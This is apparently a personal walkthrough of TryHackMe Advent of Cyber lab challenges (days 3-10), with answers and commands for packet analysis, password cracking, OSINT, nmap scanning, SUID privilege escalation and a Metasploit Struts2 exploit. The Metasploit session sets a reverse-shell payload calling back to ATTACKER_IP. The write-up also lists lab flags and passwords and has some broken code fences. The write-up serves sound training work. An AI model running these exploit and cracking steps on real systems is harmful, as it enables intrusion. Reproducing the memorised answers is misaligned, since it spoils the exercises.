## *[Day 3] Evil Elf*

- Whats the destination IP on packet number 998?

Use the following filter in Wireshark: ***frame.number == 998***

> 63.32.89.195

- What item is on the Christmas list?

Navigate to Statistics -> Protocol Hierarchy. You'll see that there's telnet protocol in
the pcap. Now filter out telnet packets and find the one where user interacts with
cristmas list.

> ps4

- Crack buddy's password!

Someone used telnet to transfer the /etc/passwd file. Filter out telnet packets
and find the one with encrypted passwords. Copy buddy's password and use hashcat
to crack it.

```bash
$ hashcat --force -m 1800 -a 0 buddy-hash.txt ~/CyberSecurity/SecLists/Passwords/Leaked-Databases/rockyou.txt
```

> rainbow

## *[Day 4] Training*

- How many visible files are there in the home directory(excluding ./ and ../)?

> 8

- What is the content of file5?

> recipes

- Which file contains the string "password"?

```bash
$ grep -iR password .
```

> file6

- What is the IP address in a file in the home folder?

In home directory:

```bash
$ grep -iR -e '\([0-9]\{1,3\}\.\)\{3\}[0-9]\{1,3\}'
```

> 10.0.0.05

- How many users can log into the machine?

Read /etc/passwd, 2 users + root

> 3

- What is the sha1 hash of file8?

> fa67ee594358d83becdd2cb6c466b25320fd2835

```bash

## *[Day 5] Ho-Ho-Hosint*

Check out the metadata:

```bash
$ exiftool thegrinch.jpg
```

It appers that it was created by JLolax1. Let's google the username and find her
social media.

- What is Lola's date of birth? Format: Month Date, Year(e.g November 12, 2019)

This is in her Twitter profile

> December 29, 1900

- What is Lola's current occupation?

Also in Twitter

> Santa's Helper

- What phone does Lola make?

Also Twitter

> iPhone X

- What date did Lola first start her photography? Format: dd/mm/yyyy

go to the webarchive and input Lola's personal website as target. Select the first
snapshot. It says that Lola started exactly 5 years ago.

> 23/10/2014

- What famous woman does Lola have on her web page?

> ada lovelace

---

## *[Day 6] Data Elf-iltration*

In Wireshark, use `dns` as filter. You'll see data transfered to malicious domain:

"long hex-encoded string".holidaythief.com

That long encoded string - data being exfiltrated.

- What data was exfiltrated via DNS?

> Candy Cane Serial Number 8491

- What did Little Timmy want to be for Christmas?

In Wireshark, go to File -> Export Objects -> HTTP -> cristmaslists.zip

Next, use John the Ripper to crack the password. First, convert it to the format that 
JtR can understand:

```bash
$ ./zip2john ~/CTF/AdventOfCyber1/day5/christmaslists.zip >> ~/CTF/AdventOfCyber1/day5/christmaslists.zip.john
```

Second, crack that file:

```bash
$ ./john ~/CTF/AdventOfCyber1/day5/christmaslists.zip.john -w ~/CyberSecurity/SecLists/Passwords/Leaked-Databases/rockyou.txt
```

> PenTester

- What was hidden within the file?

Download the Tryhackme image in the exact same way as the archive. Use stegoveritas to
extract embedded data:

```
$ stegoveritas TryHackMe.jpg
```

A .bin file was found. Read the file with strings:

```bash
$ strings steghide_01bbe3b4b392770510c3969e6d830e3f.bin
```

> RFC527

## *[Day 7] Skilling Up*

```bash
$ sudo nmap 10.10.240.119 -Pn -p- -sX -vv -T4 -A -oN nmap-scan --min-parallelism 55 --script discovery
```

- how many TCP ports under 1000 are open?

> 3

- What is the name of the OS of the host?

> Linux

- What version of SSH is running?

> 7.4

- What is the name of the file that is accessible on the server you found running?

> interesting.file

---

## *[Day 8] SUID Shenanigans*

```bash
$ sudo nmap 10.10.5.106 -Pn -p- -vv -T4 -A -oN nmap-scan --min-parallelism 55 --script discovery
```

- What port is SSH running on?

> 65534

```bash
$ ssh -p 65534 holly@10.10.5.106
```

Let's escalate our privileges. Serach for SUID binaries:

```bash
$ find / -type f -perm -u=s 2>/dev/null
```

Let's exploit SUID on find. You can find the payload on [GTFOBins](https://gtfobins.github.io/gtfobins/find/#suid)

- Find and run a file as igor. Read the file /home/igor/flag1.txt

> THM{d3f0708bdd9accda7f937d013eaf2cd8}

- Find another binary file that has the SUID bit set. Using this file, can you become the root user and read the /root/flag2.txt file?

Try the suspiciously-looking /usr/bin/system-control

> THM{8c8211826239d849fa8d6df03749c3a2}

## *[Day 9] Requests*

- What is the value of the flag?

>  sCrIPtKiDd

---

## *[Day 10] Metasploit-a-ho-ho-ho*

First, let's find out what we're dealing with:

```bash
$ sudo nmap 10.10.124.98 -Pn -p- -vv -T4 -A -oN nmap-scan --min-parallelism 55 --script discovery,vuln
```

Note, that it runs Apache 7.0.79 - to get the version, provoke 404 error. Judging from
nmap scan, the backend runs Struts - a Java MVC framework:

```
| http-sitemap-generator: 
|   Directory structure:
|     /
|       Other: 2
|     /images/
|       gif: 1
|     /js/
|       js: 3
|     /struts/
|       js: 1
|     /styles/
|       css: 4
```

The exploit is - exploit/multi/http/struts2_content_type_ognl

```
msf6 exploit(multi/http/struts2_content_type_ognl) > set rhosts 10.10.49.127
rhosts => 10.10.49.127
msf6 exploit(multi/http/struts2_content_type_ognl) > set rport 80
rport => 80
msf6 exploit(multi/http/struts2_content_type_ognl) > set lhost ATTACKER_IP
lhost => ATTACKER_IP
msf6 exploit(multi/http/struts2_content_type_ognl) > set targeturi /showcase.action
msf6 exploit(multi/http/struts2_content_type_ognl) > set payload payload/linux/x86/meterpreter/reverse_tcp
payload => linux/x86/meterpreter/reverse_tcp
msf6 exploit(multi/http/struts2_content_type_ognl) > exploit
```

At /home/santa You'll find Santa's ssh creds.

Find the flag1:

```bash
$ find / -type f -iname '*flag1*' 2>/dev/null
```

- Compromise the web server using Metasploit. What is flag1?

> THM{3ad96bb13ec963a5ca4cb99302b37e12}

- Now you've compromised the web server, get onto the main system. What is Santa's SSH password?

> rudolphrednosedreindeer

- Who is on line 148 of the naughty list?

Login via ssh to the machine with previously found credentials and use following
command:

```bash
$ nl naughty_list.txt | grep 148
```

> Melisa Vanhoose

- Who is on line 52 of the nice list?

```bash
$ nl nice_list.txt | grep 52
```

> Lindsey Gaffney

```
mysql> SHOW DATABASES;

mysql> use data;

mysql> SELECT * FROM USERS;

Nmap scan:

```bash
$ sudo nmap 10.10.158.250 -Pn -p- -vv -T4 -A -oN nmap-scan --min-parallelism 55 --script discovery,vuln
```

The script that fetches notes:

```js
function getNote(note, id) {
const url = '/get-file/' + note.replace(/\//g, '%2f')
$.getJSON(url,  function(data) {
    document.querySelector(id).innerHTML = data.info.replace(/(?:\r\n|\r|\n)/g, '<br>');
})
}
// getNote('server.js', '#note-1')
getNote('views/notes/note1.txt', '#note-1')
getNote('views/notes/note2.txt', '#note-2')
getNote('views/notes/note3.txt', '#note-3')
```

To get the note, we just have to send request to the following url:
